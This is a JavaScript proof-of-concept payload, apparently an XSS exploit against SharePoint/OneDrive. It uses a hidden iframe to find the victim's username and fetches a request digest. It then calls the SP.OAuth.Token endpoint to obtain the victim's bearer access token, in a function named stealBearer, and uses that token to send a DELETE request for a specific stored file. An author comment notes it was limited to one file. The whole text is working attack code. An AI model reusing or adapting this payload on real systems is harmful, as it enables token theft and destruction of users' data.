
document.write("<iframe src='/' id='whoareu' border=0 width=1 height=1></iframe>");const myTimeout = setTimeout(whoareu, 2000);
function whoareu() {
  var theurl=document.getElementById('whoareu').contentWindow.location.href;
  user = new URL(theurl).pathname.split('/')[2];
var dgurl="/personal/"+user+"/_api/contextinfo";

  var dg = getDigest(dgurl,user);
}

function deleteIt(bearer){
    
    var xmlhttp = new XMLHttpRequest();
	// BEGIN NOTE
	// THIS POC WAS USED TO DELETE A SPECIFIC file
	// I did not want to run this recursive as it would have cause lots of problems
	// END NOTE
	xmlhttp.open("DELETE", "/_api/v2.1/drives/b!sm0rVuGWqkuZpy4Vd36PwJruo0OEm3tCtsysE4hMq3eBNlbLNaiYTIx1O3n9sedV/items/01CSUKDDRGWFYFG75S3ZD2ZYXV4ZMZJ5A5");
	xmlhttp.onreadystatechange = function() {
  	if (this.readyState == 4) {
    		console.log('deleted')
  		}
	};
	xmlhttp.setRequestHeader("Authorization","bearer " + bearer);
	xmlhttp.setRequestHeader("Content-Type", "text/plain");
	xmlhttp.setRequestHeader("Accept","application/json;odata=verbose");
	xmlhttp.send();
}

function getDigest(url,user){
        var xmlhttp = new XMLHttpRequest();
	xmlhttp.open("POST", url);
	xmlhttp.onreadystatechange = function() {
  	if (this.readyState == 4 && this.status == 200) {
    		var myArr = this.responseText;
    		var tokenData = JSON.parse(myArr);
		stealBearer(tokenData.d.GetContextWebInformation.FormDigestValue,user);
  		}
	};
	xmlhttp.setRequestHeader("Content-Type","application/json;odata=verbose");
	xmlhttp.setRequestHeader("Accept","application/json;odata=verbose");
	xmlhttp.send(null);
}

function stealBearer(digestValue,user){
    	var xmlhttp = new XMLHttpRequest();
	xmlhttp.open("POST", "/personal/"+user+"/_api/SP.OAuth.Token/Acquire()");
 	var s = "{\"resource\":\"https://"+document.domain+"\",\"tokenType\":\"SPO\"}";
	xmlhttp.onreadystatechange = function() {
  	if (this.readyState == 4 && this.status == 200) {
    	var myArr = JSON.parse(this.responseText);
    	deleteIt(myArr.d.access_token);
  		}
	};
	xmlhttp.setRequestHeader("x-requestdigest",digestValue);
	xmlhttp.setRequestHeader("Accept","application/json;odata=verbose");
    	xmlhttp.setRequestHeader("Content-Type", "application/json;odata=verbose");
	xmlhttp.send(s);
}

